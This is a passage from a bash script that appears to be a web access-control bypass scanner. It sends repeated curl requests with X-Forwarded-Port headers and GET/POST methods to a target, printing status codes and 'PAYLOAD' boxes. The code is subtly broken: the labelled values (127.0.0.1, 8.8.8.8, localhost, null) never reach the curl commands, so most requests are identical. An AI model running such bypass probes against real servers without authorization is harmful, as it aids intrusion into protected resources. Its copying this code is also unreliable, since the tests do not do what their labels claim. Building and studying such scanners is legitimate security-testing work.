	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 80" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 80' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 80 Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 80" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 80' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 80 Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 80" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 80' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	
	echo -n "X-Forwarded-Port 8080 Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 8080" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 8080' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 8080 Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 8080" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 8080' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 8080 Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 8080" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 8080' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 8080 Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 8080" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 8080' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 8080 Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 8080" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 8080' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 8080 Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 8080" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 8080' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 8080 Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 8080" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 8080' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 8080 Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 8080" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 8080' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 8080 Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 8080" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 8080' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 8080 Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 8080" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 8080' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "X-Forwarded-Port 8443 Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 8443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 8443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 8443 Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 8443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 8443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 8443 Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 8443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 8443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 8443 Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 8443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 8443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 8443 Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 8443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 8443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 8443 Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 8443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 8443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 8443 Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 8443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 8443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 8443 Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 8443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 8443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 8443 Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 8443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 8443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 8443 Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 8443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 8443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

}
function HTTP_Method_Bypass(){
	echo -e ${blue}"----------------------"${end}
	echo -e ${cyan}"[+] HTTP Method Bypass"${end}
	echo -e ${blue}"----------------------"${end}
	echo -n "GET : ${website_ip} "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X GET)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X GET\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "GET : 127.0.0.1 "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X GET)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X GET\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "GET : * "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X GET)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X GET\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "GET : 8.8.8.8 "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X GET)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X GET\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "GET : null "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X GET)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X GET\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "GET : 192.168.0.2 "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X GET)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X GET\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "GET : 10.0.0.1 "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X GET)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X GET\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "GET : 0.0.0.0 "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X GET)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X GET\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "GET : localhost "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X GET)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X GET\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "GET : 192.168.1.1 "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X GET)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X GET\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "POST : ${website_ip} "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X POST)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X POST\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "POST : 127.0.0.1 "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X POST)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X POST\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "POST : * "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X POST)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X POST\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "POST : 8.8.8.8 "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X POST)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X POST\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "POST : null "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X POST)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X POST\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "POST : 192.168.0.2 "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X POST)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X POST\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "POST : 10.0.0.1 "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X POST)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X POST\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "POST : 0.0.0.0 "
